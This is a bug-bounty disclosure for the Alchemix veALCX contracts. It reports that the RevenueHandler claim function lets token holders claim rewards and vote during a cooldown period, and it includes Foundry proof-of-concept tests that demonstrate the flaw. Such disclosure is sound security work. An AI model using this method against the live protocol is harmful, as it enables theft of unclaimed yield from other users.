# 31447 - \[SC - High] veALCX holders are able to withdraw rewards and...

Submitted on May 19th 2024 at 12:58:15 UTC by @xBentley for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31447

Report type: Smart Contract

Report severity: High

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RewardsDistributor.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

veALCX holders are able to withdraw rewards even when their token is under cooldown. This is contrary to the docs that clearly state that users should not be able to withdraw rewards as stated here: (<https://alchemixfi.medium.com/vealcx-update-272e8900ac5a>)

## Vulnerability Details

According to the docs, veALCX holders should not be able to withdraw rewards and vote when their token enters into cooldown:

> There will be a one-epoch cooldown period between unlocked tokens and being able to claim them to the user’s wallet. The user will have no voting power and will earn no rewards during this cooldown time. Locked tokens can become eligible for unlocks by burning MANA tokens — see the MANA section below.

However, the src/RevenueHandler.sol::claim(<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L186>) function does not check this fact, allowing users to claim rewards at will.

```solidity
function claim(
        uint256 tokenId,
        address token,
        address alchemist,
        uint256 amount,
        address recipient
    ) external override {
        require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, tokenId), "Not approved or owner");

        uint256 amountBurned = 0;

        uint256 amountClaimable = _claimable(tokenId, token);
        require(amount <= amountClaimable, "Not enough claimable");
        require(amount > 0, "Amount must be greater than 0");
        require(amount <= IERC20(token).balanceOf(address(this)), "Not enough revenue to claim");

        userCheckpoints[tokenId][token].lastClaimEpoch = currentEpoch;
        userCheckpoints[tokenId][token].unclaimed = amountClaimable - amount;

        // If the alchemist is defined we know it has an alchemic-token
        if (alchemists[alchemist] != address(0)) {
            require(token == IAlchemistV2(alchemist).debtToken(), "Invalid alchemist/alchemic-token pair");

            (, address[] memory deposits) = IAlchemistV2(alchemist).accounts(recipient);
            IERC20(token).approve(alchemist, amount);

            // Only burn if there are deposits
            amountBurned = deposits.length > 0 ? IAlchemistV2(alchemist).burn(amount, recipient) : 0;
        }

        /*
            burn() will only burn up to total cdp debt
            send the leftover directly to the user
        */
        if (amountBurned < amount) {
            IERC20(token).safeTransfer(recipient, amount - amountBurned);
        }

        emit ClaimRevenue(tokenId, token, amount, recipient);
    }

```

## Impact Details

Users are able to claim rewards when their token in under cooldown contrary to the documentation.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L186>

## Proof of Concept

Add this test to src/test/RevenueHandler.t.sol for claiming revenue:

```solidity

    function testClaimRevenueSucceedsCoolDown() external {
        revenueHandler.addAlchemicToken(address(alethAlchemist));

        uint256 revAmt = 1000e18;
        uint256 tokenId = _setupClaimableRevenue(revAmt);

        uint256 claimable = revenueHandler.claimable(tokenId, alusd);
        assertGt(claimable, 0);
        hevm.warp(block.timestamp + MAXTIME + nextEpoch);
        veALCX.startCooldown(tokenId);
        claimable = revenueHandler.claimable(tokenId, alusd);
        assertGt(claimable, 0);
        revenueHandler.claim(tokenId, alusd, address(alusdAlchemist), claimable, address(this));
        assertGt(IERC20(alusd).balanceOf(address(this)), 0);

    }
```

Add this test to src/test/AlchemixGovernor.t.sol for voting:

```solidity
    function testCanVoteCoolDown() public {
        assertFalse(voter.isWhitelisted(usdc));

        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();

        hevm.warp(block.timestamp + 2 days); // delay

        // propose
        hevm.startPrank(admin);
        uint256 pid = governor.propose(t, v, c, d, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // Mint the necessary amount of flux to ragequit
        uint256 ragequitAmount = veALCX.amountToRagequit(tokenId1);
        hevm.prank(address(veALCX));
        flux.mint(admin, ragequitAmount);
        hevm.startPrank(admin);
        flux.approve(address(veALCX), ragequitAmount);
        veALCX.startCooldown(tokenId1);
        
        uint256 votes = governor.getVotes(admin, block.timestamp);
        assertLt(0, votes);
        governor.castVote(pid, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();
    }
```
